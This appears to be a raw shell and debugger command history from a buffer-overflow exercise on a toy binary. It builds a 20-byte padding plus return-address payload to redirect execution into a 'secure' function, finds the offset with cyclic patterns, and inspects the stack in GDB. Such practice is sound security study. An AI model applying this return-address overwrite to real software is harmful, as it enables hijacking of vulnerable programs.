python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\x76\x84\x04\x08')" > payload
python -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\x76\x84\x04\x08')" > payload
python2 -c "print 'A'*20 + '\x76\x84\x04\x08'" > payload
python -c "print 'A'*20 + '\x76\x84\x04\x08'" > payload
python -c "printï¼ˆ'A'*20 + '\x76\x84\x04\x08')" > payload
python -c "print('A'*20 + '\x76\x84\x04\x08')" > payload
clear
quit
objdump -d example | grep secure
quit
b main
b vulnerable 
disassemble main
disassemble vulnerable 
b *0x080491da
b secure 
run < payload
hexdump -C payload
where
disassemble 
c
where
disassemble 
stack
stack 20
i r
p $ebp-0x14 
x/10wx $ebp-0x14   
c
x/10wx $ebp-0x14 
x/wx $ebp+4 
stack 15
ni
i r eip
disassemble $eip
c
disassemble 
b secure
c
c b
clean
quit
r <payload
quit
b main
b vulnerable 
b secure 
r < payload
where
disassemble 
c
stack 20
i r
p $ebp-0x14 
x/10wx $ebp-0x14  
ni
disassemble 
c
disassemble 
where
back
disassemble 
quit
b secure
disassemble secure 
quit
cyclic 200
r
cyclic -l haaa
python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\x76\x84\x04\x08')" > payload
quit
cyclic 100
r
cyclic -l haaa
b main
b vulnerable 
b secure 
r < payload
break *vulnerable+45 
disassemble 
ni
disassemble 
ni
ni
disassemble 
nexti
c
stack 15
x/10wx $ebp-0x14 
c
disassemble 
x/10wx $ebp-0x14 
x/wx $ebp+4  
ni
i f eip
x/wx $ebp+4  
c
disassemble 
stack 15
